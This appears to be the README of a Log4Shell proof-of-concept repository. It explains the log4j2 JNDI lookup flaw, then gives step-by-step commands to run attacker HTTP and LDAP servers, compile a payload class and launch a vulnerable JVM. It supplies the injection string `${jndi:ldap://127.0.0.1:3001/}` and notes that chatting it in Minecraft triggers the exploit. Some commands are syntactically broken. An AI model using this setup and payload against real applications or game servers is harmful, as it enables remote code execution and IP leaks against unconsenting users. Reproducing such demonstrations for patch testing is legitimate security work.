# log4j2-banter

## Motivation
https://user-images.githubusercontent.com/37479424/145661983-131eb84a-9ac5-4014-9f6b-10b69d8d7cf4.mp4
This fundamental vulnerability was reported by [CVE-2018-3149](https://nvd.nist.gov/vuln/detail/CVE-2018-3149) and patched by [this article. (8u121 Release Notes)](https://www.oracle.com/java/technologies/javase/8u121-relnotes.html)
However, the logging library for java called log4j2 had [JNDILookup](https://github.com/apache/logging-log4j2/blob/20f9a97dbe5928c3b5077bcdd2a22ac92e941655/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java), which allowed access to protocols such as LDAP, which allowed code injection in older java versions.
Patched versions of java can prevent code injection, but `JNDILookup` makes request to ldap server, which can lead to IP leaks.
The solution is to update **Java** and **log4j2** versions.

## Running
0. Install requirements
```
system requirements => requirements.txt (gradle is not per say required, use any building tool with same output)
npm requirements => npm-requirements.txt
$ cd http-server && npm install && cd ../ldap-server && npm install
```
1. run `http-server` and `ldap-server` both
```
$ DATE=17-14-57_13-12-2021 && cd http-server && node index.js 2>&1 >$DATE_http-server.log & && cd ldap-server && node index.js 2>&1 >$DATE_ldap-server.log &
```
2. Compile Main.java
```bash
# This will generate Main.java - required to code injection .
# OSx
$ ./java-single-compile Main.java
# Linux 
$ javac Main.java
```
3. Start jvm with parameters
```bash
# You can still use log4j-client in repo for internal testing.
$ cd log4j-client &&\
		gradle jar &&\
		java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar build/libs/log4j-client-1.0-SNAPSHOT.jar
# Or run other application, com.sun.jndi.ldap.object.trustURLCodebase=true required for code injection, otherwise it will only request to ldap server.
$ java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar <javafile.jar>
```
4. Send `${jndi:ldap://127.0.0.1:3001/}` to any parameters as the payload
(In minecraft, just chatting this will work if exploit's working.)

## References
- https://github.com/apache/logging-log4j2/pull/608
- https://www.lunasec.io/docs/blog/log4j-zero-day/
- https://github.com/NCSC-NL/log4shell

## License [GPL3]
See License in LICENSE
